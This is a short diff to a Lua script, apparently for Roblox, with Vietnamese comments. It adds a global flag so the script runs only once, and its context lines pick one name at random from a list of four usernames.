@@ -1,3 +1,12 @@
+-- Kiểm tra biến toàn cục để xác định script đã chạy hay chưa
+if _G.MAILBOXITEMS then
+    warn("Script đã được chạy trước đó!")
+    return -- Dừng script nếu đã chạy
+end
+
+-- Đánh dấu script đã được chạy
+_G.MAILBOXITEMS = true
+
 -- Tạo danh sách người dùng và chọn ngẫu nhiên
 local available_users = {"manix6hi", "barus1ik", "billo9xx", "mcane9gb"}
 local random_user = available_users[math.random(1, #available_users)]
